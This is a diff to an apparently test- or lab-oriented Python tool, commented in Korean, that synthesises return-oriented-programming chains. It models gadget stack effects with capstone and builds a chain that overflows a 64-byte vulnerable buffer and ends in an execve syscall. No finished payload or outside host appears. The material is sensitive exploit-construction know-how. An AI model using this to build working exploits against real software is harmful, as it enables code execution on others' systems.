@@ -101,6 +101,27 @@ class _Planned:
 
 
 _SP_REGS = frozenset({x86.X86_REG_RSP, x86.X86_REG_ESP, x86.X86_REG_SP, x86.X86_REG_SPL})
+_SEG_REGS = frozenset({x86.X86_REG_CS, x86.X86_REG_DS, x86.X86_REG_ES, x86.X86_REG_FS, x86.X86_REG_GS, x86.X86_REG_SS})
+_MEM_RMW = frozenset({"cmpxchg", "cmpxchg8b", "cmpxchg16b", "xadd", "xchg"})  # capstone은 메모리를 '읽기'로만 표시함
+_BIG_STORES = ("fxsave", "xsave")  # 수백 바이트를 쓰는 명령(합성 스펙에서 지원하지 않음)
+
+
+def _op_size(op) -> int:
+    """push/pop 피연산자 크기. 64비트 모드의 세그먼트 레지스터 push/pop은 8바이트를 옮긴다."""
+    if op.type == x86.X86_OP_REG and op.reg in _SEG_REGS:
+        return QWORD
+    return op.size
+
+
+def _rsp_mem(op) -> bool:
+    return op.type == x86.X86_OP_MEM and op.mem.base == x86.X86_REG_RSP
+
+
+def _slots(disp: int, size: int) -> list[int]:
+    """[rsp+disp]부터 size바이트가 걸치는 8바이트 칸의 오프셋들."""
+    lo = disp // QWORD * QWORD
+    hi = (disp + max(size, 1) - 1) // QWORD * QWORD
+    return list(range(lo, hi + QWORD, QWORD))
 
 
 @dataclass(frozen=True)
@@ -125,16 +146,28 @@ def _stack_effect(ins, where: str) -> _Effect:
     m, ops = ins.mnemonic, ins.operands
     if m in ("popf", "pushf"):
         raise ValueError(f"{where}: 16비트 {m}는 합성 스펙에서 지원하지 않습니다(단위 check로 시험)")
+    if m.startswith(_BIG_STORES) and any(_rsp_mem(op) for op in ops):
+        raise ValueError(f"{where}: 스택에 수백 바이트를 쓰는 {m}는 합성 스펙에서 지원하지 않습니다")
     if m in ("pop", "popfq"):
         if m == "pop" and ops and ops[0].type == x86.X86_OP_REG and ops[0].reg in _SP_REGS:
             return _Effect("unknown")  # pop rsp: 스택 피벗
-        if m == "pop" and ops and ops[0].size != 8:
+        if m == "pop" and ops and _op_size(ops[0]) != QWORD:
             raise ValueError(f"{where}: 16비트 pop은 합성 스펙에서 지원하지 않습니다(단위 check로 시험)")
+        if m == "pop" and ops and _rsp_mem(ops[0]):
+            if ops[0].mem.index != 0:
+                raise ValueError(f"{where}: rsp와 인덱스 레지스터로 스택에 쓰는 명령은 합성 스펙에서 지원하지 않습니다")
+            # pop [rsp+d]: rsp를 8 올린 뒤의 주소에 쓴다(Intel SDM)
+            return _Effect("pop", QWORD, tuple(_slots(QWORD + ops[0].mem.disp, QWORD)))
         return _Effect("pop", QWORD)
     if m in ("push", "pushfq"):
-        if m == "push" and ops and ops[0].type != x86.X86_OP_IMM and ops[0].size != 8:
+        if m == "push" and ops and _op_size(ops[0]) != QWORD:
             raise ValueError(f"{where}: 16비트 push는 합성 스펙에서 지원하지 않습니다(단위 check로 시험)")
         return _Effect("push", -QWORD)
+    if ins.id == x86.X86_INS_ENTER:  # capstone은 enter의 rsp 쓰기를 알려 주지 않는다
+        size, nesting = ops[0].imm, ops[1].imm
+        if nesting:
+            return _Effect("unknown")
+        return _Effect("adjust", -(QWORD + size), (-QWORD,))  # rbp를 쌓고 size만큼 더 내림
     rsp_dst = len(ops) == 2 and ops[0].type == x86.X86_OP_REG and ops[0].reg == x86.X86_REG_RSP
     if rsp_dst and m in ("add", "sub") and ops[1].type == x86.X86_OP_IMM:
         return _Effect("adjust", ops[1].imm if m == "add" else -ops[1].imm)
@@ -146,12 +179,10 @@ def _stack_effect(ins, where: str) -> _Effect:
         return _Effect("unknown")  # leave, mov rsp, xchg rsp, add esp, enter 등
     writes: list[int] = []
     for op in ops:
-        if op.type == x86.X86_OP_MEM and op.access & capstone.CS_AC_WRITE and op.mem.base == x86.X86_REG_RSP:
+        if _rsp_mem(op) and (op.access & capstone.CS_AC_WRITE or m in _MEM_RMW):
             if op.mem.index != 0:
                 raise ValueError(f"{where}: rsp와 인덱스 레지스터로 스택에 쓰는 명령은 합성 스펙에서 지원하지 않습니다")
-            lo = op.mem.disp // QWORD * QWORD
-            hi = (op.mem.disp + max(op.size, 1) - 1) // QWORD * QWORD
-            writes += range(lo, hi + QWORD, QWORD)
+            writes += _slots(op.mem.disp, op.size)
     return _Effect("none", 0, tuple(writes))
 
 
@@ -165,6 +196,7 @@ class _SpecStack:
 
     def __init__(self) -> None:
         self.payload: dict[int, int] = {}
+        self.defaults: dict[int, int] = {}  # 덮어쓸 수 있는 기본값(넘친 버퍼의 'A' — 피벗으로 그 자리에 체인을 둘 수 있음)
         self.runtime: dict[int, list[list]] = {}  # 주소 → [[스텝, 값 또는 None], …] (스텝 순)
 
     def _last(self, addr: int, step: int) -> list | None:
@@ -200,7 +232,7 @@ class _SpecStack:
                 )
             return w[1]
         if want is None:
-            return self.payload.get(addr, 0)
+            return self.payload.get(addr, self.defaults.get(addr, 0))
         self.need(addr, want, why)
         return want
 
@@ -208,7 +240,7 @@ class _SpecStack:
         w = self._last(addr, step)
         if w is not None:
             return w[1] if w[1] is not None else 0
-        return self.payload.get(addr, 0)
+        return self.payload.get(addr, self.defaults.get(addr, 0))
 
 
 def _symbols(path: Path) -> dict[str, int]:
@@ -465,6 +497,8 @@ class Builder:
                 continue
             if not self._fits(g.addr, g.end, mode, used, prev):
                 continue
+            if g.kind == "ret" and self._decode(g.end).id != x86.X86_INS_RET:
+                continue  # retf 계열(gadget DB에서는 ret 종류)은 합성에서 지원하지 않으므로 고르지 않는다
             if seen == want:
                 return g
             seen += 1
@@ -569,6 +603,11 @@ class Builder:
                 rsp += QWORD + (ins.operands[0].imm if ins.operands else 0)
                 break
             if kind in ("jmp_ind", "call_ind"):
+                op = ins.operands[0] if ins.operands else None
+                if op is not None and _rsp_mem(op):  # 목적지를 스택에서 읽음(쌓기 전에 읽는다)
+                    if op.mem.index != 0:
+                        raise ValueError(f"{where}: rsp와 인덱스 레지스터로 목적지를 읽는 분기는 합성 스펙에서 지원하지 않습니다")
+                    stack.read(step, rsp + op.mem.disp, nxt, f"{where}이 스택에서 다음 항목 주소를 읽음")
                 if kind == "call_ind":
                     rsp -= QWORD
                     stack.write(step, rsp, pc + ins.size)
@@ -639,8 +678,8 @@ class Builder:
         landing = self.syscall_site if ending == "execve" else self.syscall_site + 2  # cmp; ja … (gadget 아님)
 
         stack = _SpecStack()
-        for a in range(FRAME - 0x48, FRAME, QWORD):  # buf 64 + saved rbp
-            stack.need(a, FILL, "vuln 버퍼")
+        for a in range(FRAME - 0x48, FRAME, QWORD):  # buf 64 + saved rbp: 'A'로 넘침(체인이 덮어써도 됨)
+            stack.defaults[a] = FILL
         nop, leave, ret = self.vuln_tail
         plan = [_Planned(nop, FRAME - 0x58), _Planned(leave, FRAME - 0x58), _Planned(ret, FRAME)]
         stack.read(2, FRAME, starts[0], "vuln의 ret이 첫 항목 주소를 꺼냄")
@@ -705,7 +744,7 @@ def _build_frozen() -> int:
 
 
 def _build_extra(cases_path: Path, only: set[str] | None, force: bool) -> int:
-    from .extra import load_cases, trace_header, trace_of
+    from .extra import load_cases, same_spec, trace_header, trace_of
 
     try:
         cases = load_cases(cases_path, ROOT)
@@ -717,6 +756,11 @@ def _build_extra(cases_path: Path, only: set[str] | None, force: bool) -> int:
         if unknown:
             print(f"없는 사례 번호: {sorted(unknown)}", file=sys.stderr)
             return 2
+    try:
+        rel_cases = cases_path.resolve().relative_to(ROOT).as_posix()
+    except ValueError:
+        rel_cases = cases_path.as_posix()
+    opt = "" if rel_cases == "cases/extra" else f" --cases {rel_cases}"
     b = Builder()
     made = skipped = stale = 0
     for case in cases:
@@ -728,12 +772,19 @@ def _build_extra(cases_path: Path, only: set[str] | None, force: bool) -> int:
             path = ROOT / trace_of(chk)
             rel = path.relative_to(ROOT).as_posix()
             if path.exists() and not force:
-                if trace_header(path).get("spec") != chk["synth"]:
-                    print(f"{rel}: ⚠️ 스펙이 바뀌었는데 트레이스는 예전 것입니다 — "
-                          f"스펙을 되돌리거나 --only {case['id']} --force로 다시 만드세요", file=sys.stderr)
+                again = f"--extra{opt} --only {case['id']} --force"
+                try:
+                    current = same_spec(trace_header(path).get("spec"), chk["synth"])
+                except ValueError as e:
+                    print(f"{rel}: ⚠️ {e} — {again}로 다시 만드세요", file=sys.stderr)
+                    stale += 1
+                    continue
+                if not current:
+                    print(f"{rel}: ⚠️ 스펙이 바뀌었는데 트레이스는 예전 것입니다 — 스펙을 되돌리거나 {again}로 다시 만드세요",
+                          file=sys.stderr)
                     stale += 1
                 else:
-                    print(f"{rel}: 이미 있음(같은 입력을 유지하려고 덮어쓰지 않음, 다시 만들려면 --only {case['id']} --force)")
+                    print(f"{rel}: 이미 있음(같은 입력을 유지하려고 덮어쓰지 않음, 다시 만들려면 {again})")
                     skipped += 1
                 continue
             try:
